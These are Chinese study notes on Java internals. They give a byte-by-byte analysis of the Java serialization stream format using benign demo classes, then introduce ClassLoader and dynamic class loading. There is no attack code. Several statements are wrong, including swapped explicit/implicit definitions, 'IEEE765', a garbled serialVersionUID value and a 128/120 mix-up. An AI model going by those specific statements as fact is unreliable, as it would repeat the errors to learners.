- java.io.ObjectInputStream 和 java.io.ObjectOutputStream ： 这俩个类为对象流输入输出类。

#### transient 关键字

另外，transient 关键字修饰的内容也不会被序列化。

- transient修饰的对象的特定数据域在执行序列化和反序列化的操作不会被序列化，它不具有序列化语义。
- 当Java对象被反序列化恢复状态的时候，程序不会调用该对象的构造函数，它会直接读取该对象在序列化时的状态，并使用状态中的属性值填充当前对象。
- transient 关键字只能修饰Java对象的成员属性，不可修饰Java对象的成员方法，也不可修饰类。

#### SerialVersionUId

Java在执行序列化的时候为了保持版本的兼容性，即JDK版本升级的时候在反序列化的过程中仍然保证Java对象的唯一性，使用该值区分。

生成方式：

- 默认使用1L

  ```
  private static final long serialVersionUID = 1L;
  ```

- 根据类名、接口名、成员方法名以及属性来生成一个64位的哈希字段

  ```
  private static final long serialVersionUID = 3495065278062841972L;
  ```

一般会自动生成这个值。

## 序列化原理和算法----基础数据

Demo

```
package serial;

import java.io.*;

class SerialBase implements Serializable {
    private String name;
    private int age = 20;

    public SerialBase() {
        System.out.println("Base Serial");
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}

public class SerialInner extends SerialBase implements  Serializable{
    private transient String name;
    private int age;

    public SerialInner() {
        System.out.println("Sub Serial");
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public void setName(String name) {
        this.name = name;
    }

    @Override
    public int getAge() {
        return age;
    }

    @Override
    public void setAge(int age) {
        this.age = age;
    }

    public static void main(String[] args) throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("inner.obj"));
        SerialInner inner = new SerialInner();
        inner.setAge(11);
        inner.setName("Yanm1e");
        
        objectOutputStream.writeBoolean(true);
        objectOutputStream.writeObject(inner);
        objectOutputStream.writeInt(120);
        objectOutputStream.writeObject("Hello World!!");
        objectOutputStream.close();

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("inner.obj"));
        System.out.println(objectInputStream.readBoolean());
        System.out.println(objectInputStream.readObject());
        System.out.println(objectInputStream.readInt());
        System.out.println(objectInputStream.readObject());
        objectInputStream.close();


    }
}
```

输出

```
Base Serial
Sub Serial
true
serial.SerialInner@48e46007
120
Hello World!!
```

用十六进制编辑器打开生成的`inner.obj`

![image-20220204200540723](img/image-20220204200540723.png)![image-20220204200540723](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220204200540723.png?lastModify=1646033842)

这些节字都是有特殊格式的。

**开始部分**

  `AC ED 00 05` : 该序列为内建序列化的初始化过程，这部分数据在写入目标介质的时候生成，

```
package serial;

import java.io.*;

public class Demo1 {
    public static void main(String[] args) throws Exception {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("demo1.obj"));
        objectOutputStream.close();
    }
}
```

生成的

![image-20220204201239038](img/image-20220204201239038.png)![image-20220204201239038](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220204201239038.png?lastModify=1646033842)

不论系统是否调用了`ObjectOutputStream`的带`write`前缀的成员函数，JVM一旦发现代码中使用了`ObjectOutputStream`类，就会向目标介质执行内建序列化操作，于是JVM首先初始化序列化数据的格式。

- `AC ED`  :  `STREAM_MAGIC` ，输出流"魔数"，程序根据这几个字节的内容确定文件类型，因此这几个字节的内容被称为魔数。
- `00 05` :  `STREAM_VERSION` ， 这个值表示了Java序列化字节流的版本号。这个版本号对应了Java使用的序列化机制的版本。

这些定义可在`java.io.ObjectStreamConstants` ： 

![image-20220204201816056](img/image-20220204201816056.png)![image-20220204201816056](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220204201816056.png?lastModify=1646033842)

从注释也可知道这两个值是写到流开头的。

**内容部分**

**writeBoolean**

```
writeBoolean(true);
```

执行此代码后生成`77 01 01` 。

`77` :  `TC_BLOCKDATA`，表示可选数据块，通常在此标记之后的数据表示该数据块的字节数。

`01` :  表示当前写入数据`boolean类型的值 true` 使用1个字节的存储空间。

`01` :  表示了数据值，01 为 true ， 00 为 false

**writeObejct**

**SerialInner元数据信息**

```
writeObject(inner);
```

`73 72 00 12`  : 该序列写入的是对象的基本信息

- `73` : `TC_OBJECT` ，表示序列化的是一个新对象
- `72` : `TC_CLASSDESC` ， 该标记一般紧跟`TC_OBJECT`标记，表示接下来的二进制序列是当前对象的类描述信息[元数据]，
- `00 12`:  该描述信息表示当前对象所属类的类名(带包名的全类名)的长度信息，0x12 是  18 ， 即`serial.SerialInner` 长度为 18 .

```
73 65 72 69 61 6C 2E 53 65 72 69 61 6C 49 6E 6E 65 72` :  18个字节数据表示当前对象所属的全类名，即`serial.SerialInner
```

![image-20220204203107721](img/image-20220204203107721.png)![image-20220204203107721](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220204203107721.png?lastModify=1646033842)

`65 5F E8 94 8B C9 F9 F1` :  8个字节表示当前对象所属类中定义的SerialCersionUID值，`10195232148139201249241` 自动生成的，也可手动指定。因为该值是 long 类型，所以占8字节。

```
private static final long serialVersionUId
```

`02 00 01` :  该序列包含当前这个对象是否支持序列化的信息，以及该类定义中成员属性的数量信息。

- `02` : 表示该对象是支持序列化的

- `00 01` : 这两位表示当前的这个对象中成员属性的数量，这里为 1 个，但是我们程序中是有2个的

  ```
  private transient String name;
  private int age;
  ```

  是因为name属性使用了关键字transient。被该关键字修饰的属性将不会被序列化，所以在目标介质的数据中就没有该成员的信息。

`49 00 03 61 67 65`  :  描述当前对象中的属性的信息，因为只有一个属性 age ，所以这里是 age 的元数据信息。

- `49` : 转化为字符为`i` ，表示age的数据类型为`int` 。
- `00 03` : 表示成员属性的名称长度。 age.length() =  3
- `61 67 65` : 表示了成员属性的名称本身，转化为字符即为`age`。

**SerialBase元数据部分(父类)**

`78 72 00 11` : 该序列表示`serial.SerialInner` 类实例化的对象描述信息的结束，以及它的父类对象描述信息的开始。

- `78` :  `TC_ENDBLOCKDATA` ， 是数据块结束的标记，表示`serial.SerialInner`类实例化的类描述信息的结束，一般二进制序列中所有的对象的类描述信息结束都会使用该标记，以表示对象描述的终止符。
- `72` `TC_CLASSDESC` ，表示一个新类的描述信息的开始，这里为`serial.SerialBase`的开始
- `00 11` : 和前面子类的信息已知，表示父类全类名的长度，这里为`17`。`serial.SerialBase`

`73 65 72 69 61 6C 2E 53 65 72 69 61 6C 42 61 73 65` : 表示当前对象所属类的全类名，即`serial.SerialBase`。

`59 74 00 73 E4 04 15 BF` :  表示父类的serialVersionUID 值。

`02 00 02` : 该序列包含了父类对象是否支持序列化的信息，以及该类的成员属性的数量信息。

- `02`  :  表示父类对象支持序列化

- `00 02` : 表示有 2 个成员属性。

  ```
  private String name;
  private int age = 20;
  ```

`49 00 03 61 67 65` : 表示父类 age 属性的描述信息

- `49` : 转化为字符为`i` ，表示age的数据类型为`int` 。
- `00 03` : 表示成员属性的名称长度。 age.length() =  3
- `61 67 65` : 表示了成员属性的名称本身，转化为字符即为`age`。

`4C 00 04 6E 61 6D 65` : 表示父类 name 属性的描述信息

- `4C` :  转换字符为`L` ，表示 name 的数据类型为 String
- `00 04` : 表示成员属性`name`的字符长度为 4 
- `6E 61 6D 65` : 转化为字符即为属性名称`name`

`74 00 12 4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74 72 69 6E 67 3B` : 该序列表示了从子类到父类的引用信息，有多少个引用就出现多少个类似序列，包括引用类型名长度以及类型名.

- `74` : `TC_STRING` ，表示新的字符串对象，这里需要用来记录存在的父类成员属性的引用-----通过测试可以知道如果父类中**没有**String类型的属性name，或者name使用了transient进行修饰过，则上述的这一整段序列就**不会**出现；
- `00 12` : 表示对象签名的长度，也就是引用类型名的长度，转换为十进制为`18` ,即"Ljava/lang/String;".length() == 18
- `4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74 72 69 6E 67 3B` : 表示字符串`Ljava/lang/String;` ，该字符串描述的是引用所属类型的类型签名，注意末尾还有分号。

`78 70` : 表示父类的类描述信息结束

- `78` : `TC_ENDBLOCKDATA` ，对象块结束的标记
- `70` : `TC_NULL` ，表示该类再也没有任何”自定义超类“——虽然Java中所有的对象都是从Object继承，但因为Object本身并**不支持**序列化，所以当父类描述信息结束后，不会再有顶级父类Object。可以知道Java序列化会递归搜索继承树上的所有父类。

**SerialInner & SerialBase 实例化信息**

上边是介绍对象的类描述信息[元数据]，接下来介绍对象的实例化信息[数据部分]。

```
00 00 00 14 70 00 00 00 0B
```

- `00 00 00 14` : 表示父类`serial.SerialBase`中 age 属性的值，换成十进制为`20`

  ```
  rivate int age = 20;
  ```

- `70` : `TC_NULL`，代表一个空引用（这里的TC_NULL只是一个空引用的数据，并不是递归继承终止符），表示父类`serial.SerialBase`中 name 属性的值，name并未进行任何初始化，根据Java的语言规则，它的值为null，对应下边的定义代码：

  ```
  private String name;
  ```

- `00 00 00 0B`  :  表示子类`serial,SerialInner` 中 age 属性的值，未初始化但是在代码中给其赋值，也即是`11` 

  ```
  inner.setAge(11);
  ```

  而 name 属性使用了 transient修饰，不会序列化，所以不仅类描述信息，在实例数据信息中也没有它。

**writeInt**

```
objectOutputStream.writeInt(120);
```

`77 04 00 00 00 78` : 描述整数  120 的详细信息。

- `77` : `TC_BLOCKDATA` ， 可选数据块，所以基础类型数据的序列化都会使用数据块的结构
- `04` : 表示当前写入的数据占 4 个字节树， 即 int 类型
- `00 00 00 78` : 转为十进制即为 120 。

**writeObject**

```
objectOutputStream.writeObject("Hello World!!");
```

`74 00 0D 48 65 6C 6C 6F 20 57 6F 72 6C 64 21 21` : 描述常量字符串的定义信息。

- `74` : `TC_STRING` ，表示一个 new String .
- `00 0D` : 换成十进制 13 , 即"Hello World!!" 的长度。
- `48 65 6C 6C 6F 20 57 6F 72 6C 64 21 21` : 表示的即为字符`Hello World!!` 。

总结：

- 针对基础数据类型，一般使用数据块的方式`TC_BLOCKDATA` 存储数据，类似上边的 true 和 128
- 使用 transient 关键字修饰的成员属性不会被序列化，会被忽略
- 除`serialVersionUID` 外，所以使用 static 修饰的成员属性隶属于类而不是对象，同样在序列化时被忽略。
- 序列化数据的时候和访问控制修饰符无关，也就是说只要是成员属性，**不在乎**它是private、protected还是public，序列化机制只关心对象的成员属性是否有transient关键字修饰；
- **在序列化某个对象类描述信息【元数据部分】的时候，先序列化当前对象所属类的描述信息，然后从下至上递归序列化它的父类的类描述信息；而在序列化实例数据信息【数据部分】的时候，先序列化父类中的成员属性，然后从上至下递归序列化成员属性，两部分数据生成的顺序刚好相反；**
- 只有成员属性才会被序列化，成员函数**不会**被序列化，也就是说序列化只针对对象的属性，而**不针对**对象的操作；

java 内建序列化算法在序列化一个定义的 java 对象的时候其顺序：

- 先序列化某个对象的类描述信息[元数据部分]，信息包括类型、类名长度、类名的值。
- 然后处理该对象内的成员属性的描述信息，若成员是对象则递归序列化该成员属性；
- 该对象信息处理完成后，递归序列化该对象所属类的父类的描述信息（包括父类中的成员信息，同上边两步），知道没有超类为止（这里没有超类表示该类属于Object的直接子类）；
- 类描述信息[元数据部分]序列化完成过后，序列化实例中的示例数据信息[实例数据部分]，从顶级父类开始。
- 从上至下递归序列化实例数据，知道当前对象为止。

## 基本数据类型序列化

java中基本数据类型有8种： byte ,  short  ,  int  , long ,  boolean  , char , float , double 。

Demo

```
package serial;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class PrimarySerial {
    public static void main(String[] args) throws Exception {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("primary.obj"));
        out.writeBoolean(true);
        out.writeBoolean(false);
        out.writeShort(32);
        out.writeInt(32);
        out.writeLong(32L);
        out.writeChar('a');
        out.writeByte(18);
        out.writeFloat(3.2f);
        out.writeByte(17);
        out.writeDouble(3.2);
        out.close();
    }
}
```

![image-20220205130229513](img/image-20220205130229513.png)![image-20220205130229513](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220205130229513.png?lastModify=1646033842)

`AC ED 00 05` :  输出流魔数和版本号。

`77` : `TC_BLOCKDATA`，可选数据块，在Java序列化生成的二进制文件中，一段连续存储在一起的基础类型数据使用这个标记开始

`20`  :  表示可选数据块占用存储空间的大小，转换成十进制数  32 ，两个boolean数据各占用1个字节，short数据占用2个字节，int数据占用4个字节，long数据占用8个字节，char占用2个字节（Unicode格式的数据），byte数据占用1个字节，float数据占用4个字节，分割线11占用1个字节，double数据占用8个字节，合计：2*1 + 2 + 4 + 8 + 2 + 1 + 4 + 1 + 8 = 32。这个标记的含义就在此——注意基础数据在序列化的时候若是连续写入，则在写入每一个数据的时候不会出现新的`TC_BLOCKDATA`标记，像之前的`SerialInner` 中间插了一个`Object` 。

```
objectOutputStream.writeBoolean(true);
objectOutputStream.writeObject(inner);
objectOutputStream.writeInt(120);
```

**Boolean数据的写入**

```
out.writeBoolean(true);
out.writeBoolean(false);
```

`01 00` : 这段序列表示写入的Boolean数据， 01 表示 true , 00 表示 false。

**Short,Int,Long数据的写入**

```
out.writeShort(32);
out.writeInt(32);
out.writeLong(32L);
```

`00 20 00 00 00 20 00 00 00 00 00 00 00 20` : 加起来14个字节。

- `00 20` : Short类型占2字节，值为 32
- `00 00 00 20` : Int类型占4字节，值为 32
- `00 00 00 00 00 00 00 20` : Long类型占8个字节，值为 32 。

**Char ，Byte数据的写入**

```
out.writeChar('a');
out.writeByte(18);
```

`00 61 12` :  2+1 = 3 个字节。

- `00 61` :  Char类型两字节，转成十进制 97 ，字符`a`, Java中的Char值是Unicode，占 2 字节
- `12` : Byte占 1字节，值为 18。

**Float，Byte，Double数据的写入**

```
out.writeFloat(3.2f);
out.writeByte(17);
out.writeDouble(3.2);
```

`40 4C CC CD 11 40 09 99 99 99 99 99 9A` ：4+1+8=13字节

- `40 4C CC CD` : Float类型占 4 字节，表示 3.2f
- `11` : Byte类型，值为 17
- `40 09 99 99 99 99 99 9A` : Double类型占8个字节，值为`3.2`

浮点数转换规范为IEEE765。

## 基本数据"顺序"和"越界"

**顺序问题**

```
package serial;


import java.io.*;

public class PrimarySpec {
    public static void main(String[] args) throws Exception {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("primaryspec.obj"));
        out.writeInt(80000);
        out.close();

        ObjectInputStream in = new ObjectInputStream(new FileInputStream("primaryspec.obj"));
        System.out.println(in.readShort());
        System.out.println(in.readShort());
        in.close();
    }
}
```

输出

```
1
14464
```

![image-20220205132926379](img/image-20220205132926379.png)![image-20220205132926379](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220205132926379.png?lastModify=1646033842)

生成的二进制序列为 4 个字节`00 01 38 80` ，

数据在序列化成字节过后本身没有类型的概念，类型是在反序列化的时候代码中的方法调用时产生的。

上边序列化一个 int 类型数据到目标介质，在反序列化时调用两次 short 类型读取，字节总长度一样，`00 01 38 80` 被当成两个 Short类型，`00 01` 为 1 ,`38 80` 为 14464。所以：在针对连续基础数据（同一个Data Block中）执行序列化和反序列化的时候，顺序很重要，如果序列化的写入顺序和反序列化的读取顺序不一致，将导致数据的逻辑错误，虽然程序本身是合法的，但这并不是开发人员的预期。

也可分为四个Boolean类型， false, true , true , true。

**越界问题**

```
package serial;

import java.io.*;

public class PrimaryRange {
    public static void main(String[] args) throws Exception {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("primaryrange.obj"));
        out.writeShort(80000);
        out.writeChar(70000);
        out.close();

        ObjectInputStream in = new ObjectInputStream(new FileInputStream("primaryrange.obj"));
        System.out.println(in.readShort());
        System.out.println(in.readChar());
        in.close();
    }
}
```

输出

```
14464
ᅰ
```

![image-20220205134148662](img/image-20220205134148662.png)![image-20220205134148662](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220205134148662.png?lastModify=1646033842)

2+2 = 4 字节。

writeShort和writeChar均可以接受Int类型的参数，也就是说传入的参数范围会超过其值本身的范围。数值80000转换成十六进制的数应该是01 38 80，应该是一个3字节的数据，但是因为调用了writeShort函数，这个函数只能向目标介质中写入两字节，所以高位的01被截断了；同样的道理70000转换成十六进制格式为01 11 70，也是一个3字节的数据，高位被截断过后writeShort只写入了低位的两个字节变成了11 70。

## 基本数据的包装类型

java种针对所有的基本类型都有其对应的封装类型。

```
package org.susan.java.serial;
 
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
 
public class WrapperSerial {
	public static void main(String[] args) throws Exception {
		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(
				"wrapper.obj"));
		// 针对Boolean数据的序列化
		out.writeBoolean(Boolean.TRUE);
		out.writeBoolean(Boolean.FALSE);
		// 针对Short的序列化
		out.writeShort(Short.valueOf("32"));
		// 针对Int的序列化
		out.writeInt(Integer.valueOf("32"));
		// 针对Long的序列化
		out.writeLong(Long.valueOf("32"));
		// 针对Char的序列化
		out.writeChar(Character.valueOf('a'));
		// 针对Byte的序列化
		out.writeByte(Byte.valueOf("12"));
		// 针对Float的序列化
		out.writeFloat(Float.valueOf("32"));
		// 针对Double的序列化
		out.writeDouble(Double.valueOf("3.2"));
		// 封装类型的另外一种方式的序列化
		
		// 针对Boolean数据的序列化
		out.writeObject(Boolean.TRUE);
		out.writeObject(Boolean.FALSE);
		// 针对Short的序列化
		out.writeObject(Short.valueOf("32"));
		// 针对Int的序列化
		out.writeObject(Integer.valueOf("32"));
		// 针对Long的序列化
		out.writeObject(Long.valueOf("32"));
		// 针对Char的序列化
		out.writeObject(Character.valueOf('a'));
		// 针对Byte的序列化
		out.writeObject(Byte.valueOf("12"));
		// 针对Float的序列化
		out.writeObject(Float.valueOf("32"));
		// 针对Double的序列化
		out.writeObject(Double.valueOf("3.2"));
 
		out.close();
	}
}
```

![image-20220206090741399](img/image-20220206090741399.png)![image-20220206090741399](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220206090741399.png?lastModify=1646033842)

- 基础数据的包装对象有两种方式实现序列化操作：数据方式和对象方式
- 数据方式仅仅针对**JDK  1.5**以及**1.5以上**的版本有效，上边代码在**JDK1.4**平台会报错，**1.4**中**只能**使用writeObject方法进行序列
- **JDK 1.5**过后，基础数据和包装对象若调用write前缀的方法生成的二进制序列是一模一样的；

从第一行的第5个字节**77**开始到第三行的第5个字节**9A**这段序列基本是一模一样的，**除了**这里写入的Byte是**12**，而Float写入的是32，目的是提供读者一个可分析的数据空间，所以接下来仅仅分析上边截取的剩余部分的字节：

```
out.writeObject(Boolean.TRUE);
out.writeObject(Boolean.FALSE);
```

`73 72 00 11` ： 该序列是Boolean对象的类描述信息

- `73` ：`TC_OBJECT` ,表明序列化的是一个新对象
- `72` :   `TC_CLASSDESC` ，紧接着描述该对象所属的类的类描述信息[元数据]
- `00 11` : 转成十进制为`17`，表示新建的对象所属全类名的长度.  "java.lang.Boolean".length() == 17

`6A 61 76 61 2E 6C 61 6E 67 2E 42 6F 6F 6C 65 61 6E` ：表示类名的字符串`java.lang.Boolean`。

`CD 20 72 80 D5 9C FA EE` : 表示 Boolean 的 serialVersionUID

`02 00 01`  : 表示该对象的属性描述信息

- `02` : 表示当前对象是支持序列化的

- `00 01` :  表述当前对象只有一个属性。

  ```
  private final boolean value;
  ```

`5A 00 05 76 61 6C 75 65`  :  描述value属性的相关信息

- `5A` : 转换成十进制`90`，表示字符 Z，表示字段类型是`boolean`类型
- `00 05` :  表示value属性的属性名长度
- `76 61 6C 75 65` : 表示Value字符串

`78 70 01` : 表示 Booleam.true 对象序列化结束部分

- `78` : `TC_ENDBLOCKDATA`，表示对象类描述信息的结束
- `70` : `TC_NULL` ，在递归序列化类描述信息的时候，发现 Boolean 没有超类，它的直接父类是 OBject，所以输出此标记
- `01` : 表示值 true

`73 71 00 7E 00 00 00` : 描述 Boolean.FALSE 执行过后的数据

- `73` : `TC_OBJECT` ，表示序列化的是一个新对象

- `71` : `TC_REFERENCE` ，该对象的类型，这里创建的类型为一个Boolean类的引用

- `00 7E 00 00` : `baseWireHandle`，表示第一个赋值的句柄

  ```
  /**
       * First wire handle to be assigned.
       */
  final static int baseWireHandle = 0x7e0000;
  ```

- `00` : 表示 false

到这里就已经完成了。

接下里的序列都差不多的。

## 对象引用探索

上边使用了常量`TC_REFERENCE`和`baseWireHandle`，

```
package serial;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class ReferenceSerial {
    public static void main(String[] args) throws Exception {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(
                "ref.obj"));
        // 检测对象
        Integer first = new Integer("2");
        Integer second = Integer.valueOf("2");
        Boolean third = new Boolean("true");
        // 第一次序列化first
        out.writeObject(first);
        out.writeObject(new Integer("3"));
        // 第二次序列化first，这里开始使用引用的方式
        out.writeObject(first);
        out.writeObject(new Integer("4"));
        out.writeObject(new Integer("5"));
        // 第一次序列化second，对象方式
        out.writeObject(second);
        out.writeObject(new Integer("6"));
        out.writeObject(new Integer("7"));
        // 第二次序列化second，引用方式
        out.writeObject(second);
        // 第一次序列化third，对象方式
        out.writeObject(third);
        out.writeObject(new Integer("6"));
        // 引用方式， 使用引用方式其值就不会变化
        out.writeObject(second);
        out.writeObject(first);
        out.writeObject(third);

        out.close();
    }
}
```

![image-20220206094211847](img/image-20220206094211847.png)![image-20220206094211847](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220206094211847.png?lastModify=1646033842)

从第五行 `78 70` 后边开始，

![image-20220206094832258](img/image-20220206094832258.png)![image-20220206094832258](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220206094832258.png?lastModify=1646033842)

总结：

- 区分Java语言的引用和TC_REFERENCE：从二进制序列可以看出，使用了标记【71】的序列就是在序列化中使用的引用TC_REFERENCE的部分，上述出现了12次；而Java语言的引用这里就不多说，上边有3个：first、second、third；从二进制序列可以看到，表示同一个Java引用的二进制序列应该是一模一样的，例如上述从第二次开始每次调用writeObject(first)的部分，其输出都为【71 00 7E 00 02】；但是TC_REFERENCE在使用的时候，其作用为：保证序列化后的数据格式中类描述信息【元数据部分】部分的唯一性，同类型的对象在序列化的时候，第一次序列化会生成类描述信息，之后都直接使用TC_REFERENCE操作；
- 针对某一个类的对象，它在第一次序列化的时候会先输出类描述信息：【73 72】TC_OBJECT TC_CLASSDESC开始，【78 70】TC_ENDBLOCKDATA TC_NULL结束，随后跟上其对象中的属性值列表。Integer类中只有value属性，first这个Java引用对应的Integer对象其value属性值为2；Boolean类中也只有value属性，third这个Java引用对应的Boolean对象其value属性值为true，类似上使用了省略号被省略部分的二进制序列；
- 关于Java对象的创建——Java在序列化的过程中，创建对象的顺序如下： 1.若创建1个新的Java对象，输出【73】TC_OBJECT表示当前创建的是一个新的对象；若不创建新的Java对象，则输出【71】TC_REFERENCE标记； 2.判断当前环境中是否有创建对象的类描述信息【元数据部分】，如果没有类描述信息使用【72】TC_CLASSDESC标记，如果已经序列化过类描述信息则使用【71】TC_REFERENCE标记（已经输出过该标记不输出第二次）； 3.类描述信息输出完成后（【78 70】结束），直接按照类中定义的属性顺序输出对象中属性的值列表； 4.如果是使用的【71】TC_REFERENCE标记，需要分为两种情况：创建Java新对象 or直接写入引用，其格式如下（接着【73 71】之后或者【71】之后）： ——创建Java新对象：先输出【00 7E 00 00】baseWireHandle变量，每次创建一个新对象的时候都会输出该变量，随后跟上对象的属性值列表； ——直接写入对象的引用：输出【00 7E 00 XX】格式（至少可以支持创建65536个新引用），这种情况不需要追加对象的属性值列表；
- TC_REFERENCE的管理：【71】TC_REFERENCE标记之后，是一个整数Int类型的数据，它生成的基数是【00 7E 00 00】baseWireHandle常量，它的值表示了序列化中Java的新对象统计数据（其值的运算根据对象的hashCode方法运算而来）。基于这个规则看看表格中的数据： 【71 00 7E 00 02】（第三行）——它和第一行的Java对象引用相等，也就表示该引用引用的Java对象是第一行创建的，同理倒数第二行也是first引用生成的二进制序列，其生成的序列值一模一样【71 00 7E 00 02】； 【71 00 7E 00 06】（倒数第三行）——它和第六行的Java对象引用相等，也就表示该引用引用的Java对象是第六行创建的，与之对应的还有第九行的序列【71 00 7E 00 06】；

太多了，直接看参考链接

http://blog.csdn.net/silentbalanceyh/article/details/8183849

https://blog.csdn.net/silentbalanceyh/article/details/8250096

来看源码分析

## 源码分析

#### ObjectOutputStream

是负责序列化的主类，

```
public class ObjectOutputStream
    extends OutputStream implements ObjectOutput, ObjectStreamConstants
```

继承了`OutputStream`实现了`ObjectOutput`，`ObjectStreamConstants`两接口。其中`ObjectStreamConstants`中定义了一些接口常量。



https://blog.csdn.net/silentbalanceyh/article/details/8294269

















https://blog.csdn.net/silentbalanceyh/article/details/8294269





# ClassLoader

## ClassLoader（类加载机制）

Java是一个依赖于`JVM`（Java虚拟机）实现的跨平台的开发语言。Java程序在运行前需要先编译成`class文件`，Java类初始化的时候会调用`java.lang.ClassLoader`加载类字节码，`ClassLoader`会调用JVM的native方法(`defineClass0/1/2`)来定义一个`java.lang.Class`实例。

`JVM框架图`：

![https://javasec.oss-cn-hongkong.aliyuncs.com/images/JvmSpec7.png](img/JvmSpec7-16421344334952.png)![https://javasec.oss-cn-hongkong.aliyuncs.com/images/JvmSpec7.png](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/JvmSpec7-16421344334952.png?lastModify=1646033842)

## Java类

Java是编译型语言，我们编写的java文件需要编译成 class 文件后才能被JVM运行，先简单了解Java类。

TestHelloWorld.java:

```
public class TestHelloWorld {
    public String Hello(){
        return "Hello World";
    }
}
```

编译`TestHelloWorld.java` ：`javac8 TestHelloWorld.java`

可以通过JDK自带的`javap`命令反汇编`TestHelloWorld.class`文件对应的`TestHelloWorld`类，使用 winhex 查看class二进制内容

![image-20220114123932483](img/image-20220114123932483.png)![image-20220114123932483](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114123932483.png?lastModify=1646033842)

![image-20220114124122336](img/image-20220114124122336.png)![image-20220114124122336](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114124122336.png?lastModify=1646033842)

JVM在执行`TestHelloWorld`之前会先解析class二进制内容，JVM执行的其实就是如上`javap`命令生成的字节码。

## ClassLoader

一切的Java类都必须经过JVM加载后才能运行，而`ClassLoader`的主要作用就是Java类文件的加载。JVM类加载器中最顶层的是`Bootstrap ClassLoadr（引导类加载器）`、`Extension ClassLoader（扩展加载器）`、`App ClassLoader（系统类加载器）`，`App ClassLoader`是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用`AppClassLoader`加载类，`ClassLoader.getSystemClassLoader()` 返回的系统类加载器也是`AppClassLoader`。

```
public static ClassLoader getSystemClassLoader() {
    initSystemClassLoader();
    if (scl == null) {
        return null;
    }
    SecurityManager sm = System.getSecurityManager();
    if (sm != null) {
        checkClassLoaderPermission(scl, Reflection.getCallerClass());
    }
    return scl;
}
```

值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个`null`值，如`java.io.File.class.getClassLoader()`将返回一个`null`对象，因为`java.io.File`类在JVM初始化的时候会被`Bootstrap ClassLoader（引导加载器）`加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被`Bootstrap ClassLoader` 类加载器所加载的类的`ClassLoader`时候都会返回`null`。

`ClassLLoader`类有如下核心方法：

- `loadClass` ： 加载指定的Java类
- `findClass`： 查找指定的java类
- `findLoadedClass`： 查找JVM已经加载过的类
- `defineClass`： 定义一个java类
- `resolveClass`： 链接指定的Java类

## Java类动态加载方式

Java类加载方式分为`显式`和`隐式`，

`隐式`即我们通常使用`java反射`或者`ClassLoader`来动态加载一个类对象，而`隐式`指的是`类名.方法名()`或 `new`类实例。

`显式`类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。

```
public class TestHelloWorld {
    static {
        System.out.println("TestHelloWorld static");
    }
    public TestHelloWorld(){
        System.out.println("TestHelloWorld construct");
    }
    public String Hello(){
        return "Hello World";
    }
}
```

常用的类动态加载方式：

- 反射加载TestHelloWorld

```
Class.forName("TestHelloWorld");
```

输出`TestHelloWorld static` ，执行了静态方法块。

```
Class.forName("TestHelloWorld",false,ClassLoader.getSystemClassLoader());
```

则不会输出任何内容。

`Class.forName("类名")`默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用`Class.forName("类名", 是否初始化类, 类加载器)`，而`ClassLoader.loadClass`默认不会初始化类方法。

- ClassLoader加载TestHelloWorld

```
ClassLoader.getSystemClassLoader().loadClass("TestHelloWorld");
```

## ClassLoader类加载流程

`ClassLoader`加载`TestHelloWorld`类重要流程如下：

1. `ClassLoader` 会调用`public Class<?> loadClass(String name)`方法加载`TestHelloWorld`类。
2. 调用`findLoadedClass`方法检查`TestHelloWorld`类是否已经初始化，如果JVM已经初始化过该类则直接返回类对象。
3. 如果创建当前`ClassLoader`时传入了父类加载器（`new ClassLoader(父类加载器)`）就使用父类加载器加载`TestHelloWorld`类，否则使用JVM的`Bootstrap ClassLoader` 加载。
4. 如果上一步无法加载`TestHelloWorld`类，那么调用自身的`findClass`方法尝试加载`TestHelloWorld` 类。
5. 如果当前的`ClassLoader`没有重写了`findClass`方法，那么直接返回类加载失败异常。如果当前类重写了`findClass`方法并通过传入的`TestHelloWorld`类名找到了对应的类字节码，那么应该调用`defineClass` 方法去JVM中注册该类。
6. 如果调用`loadClass`的时候传入的`resolve`参数为 true，那么还需要调用`resolve Class`方法链接类，默认为 false.
7. 返回一个被JVM加载后的`java.lang.Class`类对象。

## 自定义ClassLoader

`java.lang.ClassLoader`是所有类加载器的父类，`java.lang.ClassLoader`有非常多的子类加载器，比如我们用于加载jar包的`java.net.URLClassLoader`其本身通过继承`java.lang.ClassLoader`类，重写了`findClass`方法从而实现了加载目录class文件甚至远程资源文件。

